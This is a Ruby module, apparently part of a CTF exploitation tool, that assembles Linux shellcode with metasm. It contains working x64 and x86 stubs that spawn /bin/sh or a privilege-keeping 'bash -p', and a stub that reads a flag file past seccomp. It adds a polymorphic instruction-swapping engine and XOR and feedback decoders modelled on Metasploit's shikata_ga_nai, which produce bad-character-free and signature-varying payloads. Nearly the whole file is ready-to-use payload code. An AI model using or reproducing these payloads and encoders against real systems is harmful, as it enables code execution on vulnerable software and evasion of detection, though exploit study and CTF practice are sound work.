# frozen_string_literal: true

require "metasm"

module AugureProfiler
  # The target's word size, from the ELF class: which shellcode variant
  # to assemble and how wide the return address is.
  def self.arch(path)
    elf = Metasm::ELF.decode_file(path)
    (elf.header.e_class.to_s == "64") ? :x64 : :x86
  end

  # The payload source: assembly TEXT, versioned and auditable, assembled
  # on demand. No hex blobs - the shellcode of the original tool (%shc in
  # dbg.pm) becomes readable source assembled by metasm, which the
  # profiler already depends on. The call-back layout keeps every stub
  # position-independent without relocations.
  #
  # Each stub carries EQUIVALENT VARIANTS (the ghost-writing idea from
  # the metasm talks): same semantics, different bytes. rng: a seeded
  # Random - the variant picked is deterministic per seed, so the audit
  # can reproduce the exact payload.
  module Shellcode
    SOURCES = {
      sh: {
        x64: [
          <<~ASM,
            call shellcode
            path:
              db "/bin/sh", 0
            shellcode:
              pop rdi
              xor esi, esi
              xor edx, edx
              push 59
              pop rax
              syscall
          ASM
          <<~ASM
            call shellcode
            path:
              db "/bin/sh", 0
            shellcode:
              pop rdi
              push 0
              pop rsi
              push 59
              pop rax
              cdq
              syscall
          ASM
        ],
        x86: [
          <<~ASM,
            call shellcode
            path:
              db "/bin/sh", 0
            shellcode:
              pop ebx
              xor ecx, ecx
              push 11
              pop eax
              int 80h
          ASM
          <<~ASM
            call shellcode
            path:
              db "/bin/sh", 0
            shellcode:
              pop ebx
              push 11
              pop eax
              cdq
              xor ecx, ecx
              int 80h
          ASM
        ]
      },
      orw: {
        x64: [
          <<~ASM
            call readflag
            path:
              db "PATH_SLOT", 0
            readflag:
              pop rdi
              push 2
              pop rax
              xor esi, esi
              xor edx, edx
              syscall
              mov rdi, rax
              sub rsp, 128
              mov rsi, rsp
              push 64
              pop rdx
              push 0
              pop rax
              syscall
              mov rdx, rax
              mov rsi, rsp
              push 1
              pop rdi
              push 1
              pop rax
              syscall
              push 60
              pop rax
              xor edi, edi
              syscall
          ASM
        ],
        x86: [
          <<~ASM
            call readflag
            path:
              db "PATH_SLOT", 0
            readflag:
              pop ebx
              xor ecx, ecx
              xor edx, edx
              mov eax, 5
              int 80h
              mov ebx, eax
              sub esp, 128
              mov ecx, esp
              mov edx, 64
              mov eax, 3
              int 80h
              mov edx, eax
              mov ecx, esp
              mov ebx, 1
              mov eax, 4
              int 80h
          ASM
        ]
      },
      bash: {
        x64: [
          <<~ASM
            call shellcode
            path:
              db "/bin/bash", 0
            arg:
              db "-p", 0
            shellcode:
              pop rdi
              lea rsi, [rdi+10]
              push 0
              mov rdx, rsp
              push rsi
              push rdi
              mov rsi, rsp
              pop rdi
              mov eax, 59
              syscall
          ASM
        ],
        x86: [
          <<~ASM
            call shellcode
            path:
              db "/bin/bash", 0
            arg:
              db "-p", 0
            shellcode:
              pop ebx
              lea ecx, [ebx+10]
              push 0
              mov edx, esp
              push ecx
              push ebx
              mov ecx, esp
              mov eax, 11
              int 80h
          ASM
        ]
      }
    }.freeze

    # The equivalence pools (the ghost-writing engine): each named slot
    # has semantically equal replacements; the rng picks per slot and
    # inserts camouflage between the independent blocks. Deterministic
    # per seed - the audit reproduces the exact payload.
    EQUIVALENCES = {
      "zero_edx" => {"x64" => ["xor edx, edx", "push 0\npop rdx"],
                     "x86" => ["xor edx, edx", "push 0\npop edx"]},
      "zero_esi" => {"x64" => ["xor esi, esi", "push 0\npop rsi"]},
      "zero_ecx" => {"x86" => ["xor ecx, ecx", "push 0\npop ecx"]},
      "load_callnum" => {"x64" => ["push 59\npop rax", "mov eax, 59"],
                         "x86" => ["push 11\npop eax", "mov eax, 11"]},
      "junk" => {"x64" => ["xchg ax, ax", "nop", "xchg r8, r8"],
                 "x86" => ["xchg ax, ax", "nop"]}
    }.freeze

    def self.polymorph(source, arch, rng)
      return source unless rng

      key = (arch == :x64) ? "x64" : "x86"
      # the named slots, when the source uses the standard forms, get
      # replaced by a pool alternative
      out = source
      if source.include?("xor edx, edx")
        out = out.sub("xor edx, edx",
          EQUIVALENCES["zero_edx"][key].sample(random: rng))
      end
      if source.include?("xor esi, esi") && key == "x64"
        out = out.sub("xor esi, esi",
          EQUIVALENCES["zero_esi"][key].sample(random: rng))
      end
      if source.include?("xor ecx, ecx") && key == "x86"
        out = out.sub("xor ecx, ecx",
          EQUIVALENCES["zero_ecx"][key].sample(random: rng))
      end
      if source.include?("push 59\npop rax")
        out = out.sub("push 59\npop rax",
          EQUIVALENCES["load_callnum"][key].sample(random: rng))
      end
      if source.include?("push 11\npop eax")
        out = out.sub("push 11\npop eax",
          EQUIVALENCES["load_callnum"][key].sample(random: rng))
      end
      # camouflage between the blocks: a junk instruction after the path
      if out =~ /^(\s*path:\n.*?0\n)/m
        junk = EQUIVALENCES["junk"][key].sample(random: rng)
        out = out.sub(/^(\s*shellcode:\n)/) { "#{junk}\n" + Regexp.last_match(1) }
      end
      out
    end

    # klass: Metasm::X64 or Metasm::Ia32 (the target architecture).
    # path: the parameter for the path-bearing stubs (sh/bash exec the
    # path; orw reads it - the seccomp answer reads /flag, not a shell).
    # Returns the assembled bytes.
    def self.generate(klass, stub = :sh, path: nil, rng: nil)
      arch = (klass == Metasm::X64) ? :x64 : :x86
      variants = SOURCES.fetch(stub).fetch(arch)
      source = rng ? variants.sample(random: rng) : variants.first
      source = source.gsub("PATH_SLOT", path.to_s) if path
      raise ArgumentError, "this stub needs a path" if source.include?("PATH_SLOT")

      source = polymorph(source, arch, rng)
      Metasm::Shellcode.assemble(klass.new, source).encode_string
    end
  end

  # The encoders: the payload must survive the channel it travels
  # through. Two answers:
  #   - encode: a xor-key wrapper for a badchar list - the minimal
  #     decoder stub assembled on the fly;
  #   - encode_polymorphic: the shikata_ga_nai inheritance - a feedback
  #     decoder (each decoded byte seeds the next), the key per seed,
  #     camouflage between the decodes. metasploit encodes to beat the
  #     antivirus; we encode to cross the channel, and the output stays
  #     RE-PLAYABLE: the seed plus the source reproduce the exact bytes.
  module Encoder
    module_function

    def encode(bytes, badchars:, rng: nil, arch: :x64)
      # the constant-key flavour of the keyed decoder: key1 = key2 = k,
      # the same zero-free layout, the retry over the whole output
      raw = bytes.respond_to?(:bytes) ? bytes.bytes : bytes
      raise ArgumentError, "the payload exceeds 120 bytes - a 0x00-free channel needs a wider decoder" if raw.size > 120

      255.times do |k|
        next if badchars.include?(k)

        enc = raw.map { |b| b ^ k }
        enc += [0x90] while enc.size < 120
        full = wrap_keyed_decoder(enc, k, k, arch)
        return {bytes: full, key: k} if (full.unpack("C*") & badchars).empty?
      end
      raise ArgumentError, "no xor key avoids the badchars"
    end

    def encode_polymorphic(bytes, badchars:, rng:, arch: :x64)
      raise ArgumentError, "the polymorphic encoder needs a seed" unless rng

      raw = bytes.respond_to?(:bytes) ? bytes.bytes : bytes
      raise ArgumentError, "the payload exceeds 120 bytes - a 0x00-free channel needs a wider decoder" if raw.size > 120

      512.times do
        key1 = rng.rand(1..0xff)
        key2 = rng.rand(1..0xff)
        enc = raw.each_with_index.map { |b, i| b ^ (i.even? ? key1 : key2) }
        enc += [0x90] while enc.size < 120
        full = wrap_keyed_decoder(enc, key1, key2, arch)
        return {bytes: full, keys: [key1, key2]} if (full.unpack("C*") & badchars).empty?
      end
      raise ArgumentError, "no key pair avoids the badchars"
    end

    def wrap_keyed_decoder(enc, key1, key2, arch)
      klass = (arch == :x64) ? Metasm::X64 : Metasm::Ia32
      data = enc.pack("C*")
      size = enc.size
      dest = (arch == :x64) ? "rdi" : "ebx"
      k1 = (arch == :x64) ? "rax" : "eax"
      k2 = (arch == :x64) ? "rbx" : "ebx"
      cnt = (arch == :x64) ? "rcx" : "ecx"
      # The zero-free get-pc, the shikata layout: the decoder first, the
      # backward call (a negative rel32 carries ff bytes, never 00), the
      # payload right after the call, the loop falls through into it.
      asm = <<~ASM
        jmp gz1
        gz0:
          pop #{dest}
          push #{size}
          pop #{cnt}
          push #{key1}
          pop #{k1}
          push #{key2}
          pop #{k2}
        loop:
          xor byte ptr [#{dest}], al
          xchg al, bl
          inc #{dest}
          dec #{cnt}
          jnz loop
          jmp pay0
        gz1:
          call gz0
        pay0:
          db #{data.bytes.map { |b| "0x#{b.to_s(16)}" }.join(", ")}
      ASM
      Metasm::Shellcode.assemble(klass.new, asm).encode_string
    end
  end
end
